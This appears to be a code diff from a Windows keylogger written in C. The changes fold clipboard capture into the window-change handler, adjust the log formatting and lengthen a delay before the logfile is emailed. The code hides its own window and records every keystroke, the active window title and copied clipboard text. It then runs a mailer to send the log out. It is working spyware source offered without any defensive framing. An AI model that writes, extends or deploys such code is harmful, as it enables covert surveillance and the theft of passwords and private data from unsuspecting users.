@@ -17,8 +17,8 @@ char* GetTime();
 void HideWindow();
 void InitLogfile(char* logfile_path);
 int GetLogfileLength(char* logfile_path);
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile);
-void UpdateClipboard(char* logfile_path, char* prev_clipboard);
+void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile);
+void UpdateClipboard(char* prev_clipboard, FILE* logfile);
 void ExecuteMailer(char* mailer_path, char* directory);
 void KeystrokeHandler(short key, FILE* logfile);
 
@@ -53,9 +53,6 @@ int main(){
     while(1){
 
         Sleep(10); // reduce CPU usage
-
-        // check for new copied content
-        UpdateClipboard(logfile_path, clipboard);
         
         // loop thru keyboard characters
         for(short key = 8; key <= 222; key++){
@@ -67,7 +64,7 @@ int main(){
 
                 // open keylog file then handle keystroke
                 FILE* logfile = fopen(logfile_path, "a");
-                GetCurrentWindow(window, new_window, logfile);
+                UpdateCurrentWindow(window, new_window, clipboard, logfile);
                 KeystrokeHandler(key, logfile);
                 fclose(logfile);
             }
@@ -224,7 +221,7 @@ void HideWindow(){
     ShowWindow(stealth, 0); // set to 0 to not display
 }
 
-// initialize logfile filename and header
+// initialize logfile path and header
 void InitLogfile(char* logfile_path){
     DWORD len = BUF_SIZE+1;
     
@@ -263,8 +260,8 @@ int GetLogfileLength(char* logfile_path){
     return lines;
 }
 
-// get the current working window of the user
-void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
+// update current working window of the user
+void UpdateCurrentWindow(char* window, char* new_window, char* prev_clipboard, FILE* logfile){
     HWND new_foreground = GetForegroundWindow();
     GetWindowText(new_foreground, window, BUF_SIZE);
 
@@ -274,19 +271,22 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile){
 
         // if changed/updated, display current window and time
         if(!strcmp(window, new_window) && strcmp(window, "")){
-            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
+            UpdateClipboard(prev_clipboard, logfile);
+            fprintf(logfile, "\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
             fflush(logfile);
         }
     }
 }
 
-// get the current contents of the clipboard
-void UpdateClipboard(char* logfile_path, char* prev_clipboard){
+// update clipboard contents in logfile
+void UpdateClipboard(char* prev_clipboard, FILE* logfile){
     if(OpenClipboard(NULL)){
+        // picture
         if(IsClipboardFormatAvailable(CF_BITMAP)){
-            // notify that a picture is currently copied
+            fprintf(logfile, "\n\nCLIPBOARD:\n[PICTURE COPIED]\n:END CLIPBOARD");
             CloseClipboard();
         }
+        // text
         else if(IsClipboardFormatAvailable(CF_TEXT)){
             HWND clipboard = GetClipboardData(CF_TEXT);
             CloseClipboard();
@@ -294,13 +294,12 @@ void UpdateClipboard(char* logfile_path, char* prev_clipboard){
             // compare to previous clipboard and update logfile iff new content
             if(strcmp(prev_clipboard, (char*)clipboard) != 0){
                 strncpy(prev_clipboard, (char*)clipboard, CLIP_SIZE);
-                FILE* logfile = fopen(logfile_path, "a");
-                fprintf(logfile, "\nCLIPBOARD: %s\n --- END CLIPBOARD ---\n", prev_clipboard);
-                fflush(logfile);
-                fclose(logfile);
+                fprintf(logfile, "\n\nCLIPBOARD:\n%s\n:END CLIPBOARD", prev_clipboard);
+            }
+            else{
+                fprintf(logfile, "\n"); // formatting purposes
             }
         }
-        // TODO add UNICODE conditional
     }
 }
 
@@ -326,7 +325,7 @@ void ExecuteMailer(char* mailer_path, char* directory){
     // wait for child process to complete to prevent emailing emptied logfile
     WaitForSingleObject(&pi.hProcess, INFINITE);
     CloseHandle(&pi);
-    Sleep(2000);
+    Sleep(5000);
 }
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
